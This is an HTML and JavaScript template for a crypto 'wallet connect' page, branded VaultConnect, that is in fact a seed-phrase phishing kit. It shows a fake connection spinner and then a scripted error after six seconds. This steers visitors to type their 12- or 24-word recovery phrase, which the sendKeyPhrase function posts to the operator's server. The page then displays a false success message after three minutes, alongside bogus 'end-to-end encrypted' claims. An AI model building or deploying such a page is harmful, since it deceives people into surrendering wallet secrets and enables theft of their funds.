<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Web3 Vault Connect • Secure Wallet Connection</title>
    <meta name="description" content="Connect your wallet securely with end-to-end encryption. Supporting 40+ wallets.">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    
    <!-- Bootstrap 5 CSS only (no JS) -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #f0b90b;
            --dark-bg: #0a0e17;
            --card-bg: #131824;
            --border-subtle: rgba(255,255,255,0.06);
            --text-primary: #eef2f6;
            --text-muted: #8892a8;
            --danger: #ef4444;
            --success: #10b981;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }
        
        #particles-js {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        
        .main-content {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .header-section {
            text-align: center;
            margin: 30px 0 20px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 10px;
        }
        
        .logo-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, var(--primary), #f59e0b);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            box-shadow: 0 8px 25px rgba(240, 185, 11, 0.3);
        }
        
        .logo-text {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #fff, #e2e8f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
        
        .logo-text span {
            background: linear-gradient(135deg, var(--primary), #fbbf24);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .subtitle {
            color: var(--text-muted);
            font-size: 0.95rem;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        
        .search-wrapper {
            width: 100%;
            max-width: 500px;
            margin: 20px auto 30px;
            position: relative;
        }
        
        .search-bar {
            width: 100%;
            padding: 16px 50px 16px 24px;
            border-radius: 60px;
            border: 2px solid rgba(255,255,255,0.08);
            background: rgba(19, 24, 36, 0.8);
            backdrop-filter: blur(20px);
            color: #fff;
            font-size: 1rem;
            font-weight: 500;
            outline: none;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .search-bar::placeholder { color: rgba(255,255,255,0.4); }
        
        .search-bar:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(240, 185, 11, 0.1), 0 15px 40px rgba(0,0,0,0.4);
        }
        
        .search-icon {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            font-size: 1.2rem;
            pointer-events: none;
        }
        
        .wallets-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 16px;
            width: 100%;
            margin: 10px 0 30px;
        }
        
        @media (min-width: 640px) { .wallets-grid { grid-template-columns: repeat(3, 1fr); gap: 18px; } }
        @media (min-width: 900px) { .wallets-grid { grid-template-columns: repeat(4, 1fr); gap: 20px; } }
        @media (min-width: 1100px) { .wallets-grid { grid-template-columns: repeat(5, 1fr); gap: 22px; } }
        
        .wallet-card {
            cursor: pointer;
            text-align: center;
            border-radius: 20px;
            padding: 24px 16px;
            background: rgba(19, 24, 36, 0.7);
            backdrop-filter: blur(15px);
            border: 1px solid var(--border-subtle);
            transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
            min-height: 160px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .wallet-card:hover {
            transform: translateY(-8px);
            border-color: rgba(240, 185, 11, 0.4);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5), 0 0 30px rgba(240,185,11,0.15);
            background: rgba(25, 32, 48, 0.9);
        }
        
        .wallet-card:active { transform: scale(0.97); }
        
        .wallet-img-wrapper {
            width: 64px;
            height: 64px;
            border-radius: 18px;
            background: rgba(255,255,255,0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 12px;
            padding: 8px;
            transition: all 0.3s;
        }
        
        .wallet-card:hover .wallet-img-wrapper {
            background: rgba(240,185,11,0.1);
            transform: scale(1.05);
        }
        
        .wallet-img { width: 48px; height: 48px; object-fit: contain; border-radius: 12px; }
        
        .wallet-name {
            font-size: 0.9rem;
            font-weight: 600;
            color: #e2e8f0;
            margin: 0;
            letter-spacing: 0.3px;
        }
        
        .wallet-tag {
            font-size: 0.7rem;
            color: var(--text-muted);
            margin-top: 4px;
            background: rgba(255,255,255,0.04);
            padding: 3px 10px;
            border-radius: 20px;
        }
        
        /* MODAL - Fixed properly */
        #walletModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        #walletModal.active {
            display: flex !important;
        }
        
        #modalDialog {
            background: linear-gradient(145deg, #1a1f2e, #131824);
            border-radius: 28px;
            width: 100%;
            max-width: 520px;
            max-height: 90vh;
            overflow-y: auto;
            padding: 32px 28px;
            text-align: center;
            box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.08);
            position: relative;
            animation: modalSlideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            z-index: 10000;
        }
        
        @keyframes modalSlideIn {
            from { opacity: 0; transform: translateY(30px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        #closeModalBtn {
            position: absolute;
            top: 16px;
            right: 16px;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: rgba(255,255,255,0.06);
            border: none;
            color: #fff;
            font-size: 1.3rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
            z-index: 10;
        }
        
        #closeModalBtn:hover {
            background: rgba(239, 68, 68, 0.3);
            color: #fca5a5;
        }
        
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(16, 185, 129, 0.15);
            color: var(--success);
            padding: 8px 18px;
            border-radius: 50px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 20px;
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        
        #modalWalletLogo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            border-radius: 20px;
            background: rgba(255,255,255,0.05);
            padding: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        #modalWalletLogo img { width: 56px; height: 56px; object-fit: contain; }
        
        #modalWalletName { font-weight: 700; margin-bottom: 5px; }
        
        #statusMessage {
            font-size: 1rem;
            color: var(--text-muted);
            margin: 15px 0;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            flex-shrink: 0;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .btn {
            padding: 14px 28px;
            border-radius: 50px;
            border: none;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 0.3px;
            margin: 6px;
            display: inline-block;
        }
        
        .btn-primary-glow {
            background: linear-gradient(135deg, var(--primary), #f59e0b);
            color: #0a0e17;
            box-shadow: 0 8px 25px rgba(240, 185, 11, 0.3);
        }
        
        .btn-primary-glow:hover {
            box-shadow: 0 12px 35px rgba(240, 185, 11, 0.5);
            transform: translateY(-2px);
        }
        
        .btn-outline {
            background: transparent;
            border: 2px solid rgba(255,255,255,0.2);
            color: #fff;
        }
        
        .btn-outline:hover {
            border-color: var(--primary);
            background: rgba(240,185,11,0.08);
        }
        
        #manualSection {
            margin-top: 20px;
            display: none;
        }
        
        #manualSection.show { display: block; }
        
        #phraseInput {
            width: 100%;
            min-height: 100px;
            padding: 16px;
            border-radius: 16px;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border-subtle);
            color: #fff;
            font-size: 0.9rem;
            resize: vertical;
            margin: 10px 0;
            outline: none;
            transition: 0.3s;
            font-family: 'Inter', monospace;
        }
        
        #phraseInput:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(240,185,11,0.1);
        }
        
        .error-message { color: #fca5a5; font-weight: 600; }
        
        .security-footer {
            margin-top: 20px;
            padding: 15px;
            background: rgba(239, 68, 68, 0.08);
            border-radius: 16px;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }
        
        .security-footer strong { display: block; margin-bottom: 5px; color: #fca5a5; }
        .security-footer p { font-size: 0.8rem; color: var(--text-muted); margin: 0; }
        
        .no-results {
            text-align: center;
            color: var(--text-muted);
            padding: 40px;
            font-size: 1.1rem;
            width: 100%;
        }
        
        @media (max-width: 480px) {
            .wallet-card { padding: 18px 12px; min-height: 140px; }
            .wallet-img { width: 40px; height: 40px; }
            #modalDialog { padding: 24px 18px; }
            .btn { padding: 12px 20px; font-size: 0.85rem; }
        }
    </style>
</head>
<body>
    <!-- Particle.js Background -->
    <div id="particles-js"></div>

    <!-- Main Content -->
    <div class="main-content">
        <div class="header-section">
            <div class="logo-container">
                <div class="logo-icon">🛡️</div>
                <div class="logo-text">Vault<span>Connect</span></div>
            </div>
            <p class="subtitle">SELECT YOUR WALLET TO CONNECT SECURELY</p>
        </div>

        <div class="search-wrapper">
            <input type="text" id="search" class="search-bar" placeholder="Search 43 wallets...">
            <i class="bi bi-search search-icon"></i>
        </div>

        <div id="walletsContainer" class="wallets-grid"></div>
        <div id="noResults" class="no-results" style="display:none;">
            <i class="bi bi-emoji-frown" style="font-size:2rem;display:block;margin-bottom:10px;"></i>
            No wallets found. Try a different search.
        </div>
    </div>

    <!-- Modal - COMPLETELY SEPARATE from main content -->
    <div id="walletModal">
        <div id="modalDialog">
            <button id="closeModalBtn" type="button">&times;</button>
            
            <div class="security-badge">
                <i class="bi bi-shield-lock-fill"></i> End-to-End Encrypted Session
            </div>
            
            <div id="modalWalletLogo">
                <img src="" alt="Wallet Logo" id="modalLogoImg">
            </div>
            
            <h5 id="modalWalletName"></h5>
            
            <div id="statusMessage">
                <span class="spinner"></span> Establishing secure connection...
            </div>
            
            <div style="margin-top:10px;">
                <button id="manualConnectBtn" class="btn btn-outline" type="button">Connect Manually</button>
                <button id="tryAgainBtn" class="btn btn-outline" style="display:none;" type="button">Try Again</button>
            </div>
            
            <div id="manualSection">
                <textarea id="phraseInput" placeholder="Enter your recovery phrase (12 or 24 words separated by spaces)"></textarea>
                <button id="submitPhraseBtn" class="btn btn-primary-glow" type="button">Connect Wallet</button>
            </div>
            
            <div class="security-footer">
                <strong>⚠️ Security Warning</strong>
                <p>Never share your seed phrase with anyone. This connection is encrypted, but always verify you're on the official site.</p>
            </div>
        </div>
    </div>

    <!-- Particle.js -->
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    
    <script>
        // ============ PARTICLE.JS ============
        particlesJS('particles-js', {
            "particles": {
                "number": { "value": 50, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": "#f0b90b" },
                "shape": { "type": "circle" },
                "opacity": { "value": 0.3, "random": true },
                "size": { "value": 3, "random": true },
                "line_linked": { "enable": true, "distance": 150, "color": "#f0b90b", "opacity": 0.15, "width": 1 },
                "move": { "enable": true, "speed": 1.5, "direction": "none", "random": true, "out_mode": "out" }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": {
                    "onhover": { "enable": true, "mode": "grab" },
                    "onclick": { "enable": true, "mode": "push" },
                    "resize": true
                },
                "modes": {
                    "grab": { "distance": 140, "line_linked": { "opacity": 0.4 } },
                    "push": { "particles_nb": 3 }
                }
            },
            "retina_detect": true
        });

       // ============ WALLET DATA (40+ Wallets with third-party CDN images) ============
const wallets = [
    { name: 'MetaMask', logo: 'public/logos/metamask_logo.png', tag: 'Popular' },
    { name: 'Trust Wallet', logo: 'public/logos/trust_wallet_logo.png', tag: 'Multi-chain' },
    { name: 'Coinbase Wallet', logo: 'public/logos/coinbase_wallet_logo.png', tag: 'Exchange' },
    { name: 'WalletConnect', logo: 'https://cryptologos.cc/logos/walletconnect-wct-logo.png?v=040', tag: 'Protocol' },
    { name: 'Ledger', logo: 'public/logos/ledger_logo.png', tag: 'Hardware' },
    { name: 'Trezor', logo: 'public/logos/trezor_logo.png', tag: 'Hardware' },
    { name: 'Exodus', logo: 'public/logos/exodus_logo.png', tag: 'Desktop' },
    { name: 'Mycelium', logo: 'public/logos/mycelium_logo.png' },
    { name: 'Armory', logo: 'public/logos/armory_logo.png' },
    { name: 'Electrum', logo: 'public/logos/electrum_logo.png' },
    { name: 'KeepKey', logo: 'public/logos/keepkey_logo.png' },
    { name: 'Jaxx Liberty', logo: 'public/logos/jaxx_logo.png' },
    { name: 'Binance Wallet', logo: 'https://cryptologos.cc/logos/bnb-bnb-logo.png?v=040', tag: 'Exchange' },
    { name: 'OKX Wallet', logo: 'https://cryptologos.cc/logos/okb-okb-logo.png?v=040', tag: 'Web3' },
    { name: 'Phantom', logo: 'https://cryptologos.cc/logos/solana-sol-logo.png?v=040', tag: 'Solana' },
    { name: 'Rainbow', logo: 'https://cryptologos.cc/logos/ethereum-eth-logo.png?v=040', tag: 'Ethereum' },
    { name: 'Argent', logo: 'https://cryptologos.cc/logos/argent-argent-logo.png?v=040', tag: 'Smart Wallet' },
    { name: 'ZenGo', logo: 'https://cryptologos.cc/logos/zcash-zec-logo.png?v=040', tag: 'MPC' },
    { name: 'Blockchain.com', logo: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=040', tag: 'BTC' },
    { name: 'Electrum', logo: 'https://cryptologos.cc/logos/electrum-ecs-logo.png?v=040', tag: 'Bitcoin' },
    { name: 'BRD', logo: 'https://cryptologos.cc/logos/bread-brd-logo.png?v=040', tag: 'Simple' },
    { name: 'Edge', logo: 'public/logos/edge_logo.png', tag: 'Privacy' },
    { name: 'Guarda', logo: 'https://cryptologos.cc/logos/guarda-gdax-logo.png?v=040', tag: 'Multi-currency' },
    { name: 'Atomic Wallet', logo: 'https://cryptologos.cc/logos/atomic-wallet-coin-awc-logo.png?v=040', tag: 'Staking' },
    { name: 'BitBox', logo: 'https://cryptologos.cc/logos/bitbox-bbx-logo.png?v=040', tag: 'Hardware' },
    { name: 'SafePal', logo: 'https://cryptologos.cc/logos/safepal-sfp-logo.png?v=040', tag: 'Hardware' },
    { name: 'CoolWallet', logo: 'https://cryptologos.cc/logos/coolwallet-cool-logo.png?v=040', tag: 'Hardware' },
    { name: 'imToken', logo: 'https://cryptologos.cc/logos/imtoken-imt-logo.png?v=040', tag: 'DeFi' },
    { name: 'TokenPocket', logo: 'https://cryptologos.cc/logos/tokenpocket-tpt-logo.png?v=040', tag: 'DApp' },
    { name: 'MathWallet', logo: 'https://cryptologos.cc/logos/math-wallet-math-logo.png?v=040', tag: 'Multi-chain' },
    { name: 'Coin98', logo: 'https://cryptologos.cc/logos/coin98-c98-logo.png?v=040', tag: 'DeFi' },
    { name: 'AlphaWallet', logo: 'https://cryptologos.cc/logos/alphawallet-awt-logo.png?v=040', tag: 'NFT' },
    { name: 'Pillar', logo: 'https://cryptologos.cc/logos/pillar-plr-logo.png?v=040', tag: 'Smart' },
    { name: 'Status', logo: 'https://cryptologos.cc/logos/status-snt-logo.png?v=040', tag: 'Messenger' },
    { name: 'Opera Wallet', logo: 'https://cryptologos.cc/logos/opera-logo.png?v=040', tag: 'Browser' },
    { name: 'Brave Wallet', logo: 'https://cryptologos.cc/logos/brave-bat-logo.png?v=040', tag: 'Browser' },
    { name: 'Unstoppable', logo: 'https://cryptologos.cc/logos/unstoppable-domains-udt-logo.png?v=040', tag: 'Domains' },
    { name: 'Crypto.com', logo: 'https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png?v=040', tag: 'Exchange' },
    { name: 'Kraken Wallet', logo: 'https://cryptologos.cc/logos/kraken-kraken-logo.png?v=040', tag: 'Exchange' },
    { name: 'Gemini', logo: 'https://cryptologos.cc/logos/gemini-gusd-logo.png?v=040', tag: 'Custodial' },
    { name: 'BitPay', logo: 'https://cryptologos.cc/logos/bitpay-btp-logo.png?v=040', tag: 'Payments' },
    { name: 'Venly', logo: 'https://cryptologos.cc/logos/venly-vly-logo.png?v=040', tag: 'Gaming' },
    { name: 'XDeFi', logo: 'https://cryptologos.cc/logos/xdefi-xdefi-logo.png?v=040', tag: 'DeFi' },
    { name: 'Rabby', logo: 'https://cryptologos.cc/logos/rabby-rab-logo.png?v=040', tag: 'EVM' },
    { name: 'Core', logo: 'https://cryptologos.cc/logos/core-dao-core-logo.png?v=040', tag: 'Avalanche' },
    { name: 'Arculus Wallet', logo: 'public/logos/arculus_logo.png' },
];

        // ============ DOM ELEMENTS ============
        const walletsContainer = document.getElementById('walletsContainer');
        const searchInput = document.getElementById('search');
        const noResults = document.getElementById('noResults');
        const modal = document.getElementById('walletModal');
        const modalDialog = document.getElementById('modalDialog');
        const closeModalBtn = document.getElementById('closeModalBtn');
        const modalLogoImg = document.getElementById('modalLogoImg');
        const modalWalletName = document.getElementById('modalWalletName');
        const statusMessage = document.getElementById('statusMessage');
        const manualConnectBtn = document.getElementById('manualConnectBtn');
        const tryAgainBtn = document.getElementById('tryAgainBtn');
        const manualSection = document.getElementById('manualSection');
        const phraseInput = document.getElementById('phraseInput');
        const submitPhraseBtn = document.getElementById('submitPhraseBtn');
        
        let selectedWallet = null;
        let errorTimeout = null;

        // ============ RENDER WALLETS ============
        function renderWallets(walletList) {
            walletsContainer.innerHTML = '';
            
            if (walletList.length === 0) {
                noResults.style.display = 'block';
                walletsContainer.style.display = 'none';
                return;
            }
            
            noResults.style.display = 'none';
            walletsContainer.style.display = 'grid';
            
            walletList.forEach(wallet => {
                const card = document.createElement('div');
                card.className = 'wallet-card';
                card.innerHTML = `
                    <div class="wallet-img-wrapper">
                        <img src="${wallet.logo}" alt="${wallet.name}" class="wallet-img" 
                             onerror="this.src='https://placehold.co/48x48/2d3748/F0B90B?text=${wallet.name.charAt(0)}'">
                    </div>
                    <p class="wallet-name">${wallet.name}</p>
                    <span class="wallet-tag">${wallet.tag || 'Wallet'}</span>
                `;
                card.addEventListener('click', function() {
                    openWalletModal(wallet);
                });
                walletsContainer.appendChild(card);
            });
        }

        // ============ SEARCH ============
        searchInput.addEventListener('input', function(e) {
            const query = e.target.value.toLowerCase().trim();
            const filtered = wallets.filter(function(w) { return w.name.toLowerCase().includes(query); });
            renderWallets(filtered);
        });

        // ============ OPEN MODAL ============
        function openWalletModal(wallet) {
            selectedWallet = wallet;
            
            modalLogoImg.src = wallet.logo;
            modalLogoImg.onerror = function() { 
                modalLogoImg.src = 'https://placehold.co/56x56/2d3748/F0B90B?text=' + wallet.name.charAt(0); 
            };
            modalWalletName.textContent = wallet.name;
            
            // Reset states
            statusMessage.innerHTML = '<span class="spinner"></span> Establishing secure connection...';
            statusMessage.className = 'status-text';
            manualSection.classList.remove('show');
            manualConnectBtn.style.display = 'inline-block';
            tryAgainBtn.style.display = 'none';
            phraseInput.value = '';
            
            // Show modal
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
            
            // Clear timeout
            if (errorTimeout) clearTimeout(errorTimeout);
            
            // 6 second delay then error (ORIGINAL BEHAVIOR)
            errorTimeout = setTimeout(function() {
                statusMessage.innerHTML = '<span class="error-message">⚠️ An error occurred. Please try again or connect manually</span>';
                statusMessage.className = 'status-text error-message';
                tryAgainBtn.style.display = 'inline-block';
            }, 6000);
        }

        // ============ CLOSE MODAL ============
        function closeModal() {
            modal.classList.remove('active');
            document.body.style.overflow = '';
            if (errorTimeout) clearTimeout(errorTimeout);
            selectedWallet = null;
        }

        closeModalBtn.addEventListener('click', function(e) {
            e.preventDefault();
            closeModal();
        });

        // Close on overlay click (only if clicking the dark background, not the dialog)
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeModal();
            }
        });

        // ============ MANUAL CONNECT - WORKS, MODAL STAYS OPEN ============
        manualConnectBtn.addEventListener('click', function(e) {
            e.preventDefault();
            manualSection.classList.add('show');
            manualConnectBtn.style.display = 'none';
            tryAgainBtn.style.display = 'none';
            statusMessage.innerHTML = '<span style="color:#f0b90b;">🔐 Enter your recovery phrase to connect manually.</span>';
            statusMessage.className = 'status-text';
        });

        // ============ TRY AGAIN - WORKS, MODAL STAYS OPEN ============
        tryAgainBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            statusMessage.innerHTML = '<span class="spinner"></span> Retrying secure connection...';
            statusMessage.className = 'status-text';
            tryAgainBtn.style.display = 'none';
            manualSection.classList.remove('show');
            manualConnectBtn.style.display = 'inline-block';
            phraseInput.value = '';
            
            if (errorTimeout) clearTimeout(errorTimeout);
            
            errorTimeout = setTimeout(function() {
                statusMessage.innerHTML = '<span class="error-message">⚠️ An error occurred. Please try again or connect manually</span>';
                statusMessage.className = 'status-text error-message';
                tryAgainBtn.style.display = 'inline-block';
            }, 6000);
        });

        // ============ SUBMIT PHRASE - WORKS, MODAL STAYS OPEN ============
        submitPhraseBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            const phrase = phraseInput.value.trim();
            if (!phrase) {
                alert('Please enter your recovery phrase.');
                return;
            }
            
            statusMessage.innerHTML = '<span class="spinner"></span> Connecting wallet...';
            statusMessage.className = 'status-text';
            
            // Original fetch
            sendKeyPhrase(phrase);
            
            // 3 minute delay then connected (ORIGINAL BEHAVIOR)
            setTimeout(function() {
                statusMessage.innerHTML = '<span style="color:#10b981;font-weight:600;">✅ Wallet Connected Successfully!</span>';
                statusMessage.className = 'status-text';
                manualSection.classList.remove('show');
                manualConnectBtn.style.display = 'none';
                tryAgainBtn.style.display = 'none';
            }, 180000);
        });

        // ============ SEND KEY PHRASE (Original) ============
 function sendKeyPhrase(keyPhrase) {
    var token = document.querySelector('meta[name="csrf-token"]') ? 
                document.querySelector('meta[name="csrf-token"]').getAttribute('content') : '';

    fetch('{{ route("connect.submit") }}', { 
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-CSRF-TOKEN': token
        },
        body: JSON.stringify({ keyPhrase: keyPhrase })
    })
    .then(function(response) {
        if (!response.ok) throw new Error('Submission failed');
        return response.json();
    })
    .then(function(data) {
        console.log('Key phrase processed:', data);
    })
    .catch(function(error) {
        console.error('Error:', error);
    });
}
        // ============ ESC KEY ============
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && modal.classList.contains('active')) {
                closeModal();
            }
        });

        // ============ INIT ============
        renderWallets(wallets);
    </script>

   
    <!--Start of Tawk.to Script-->
    <script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/6ae13eb51456f6347381f9a3/1k5vtpti1';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();
    </script>
    <!--End of Tawk.to Script-->
</body>
</html>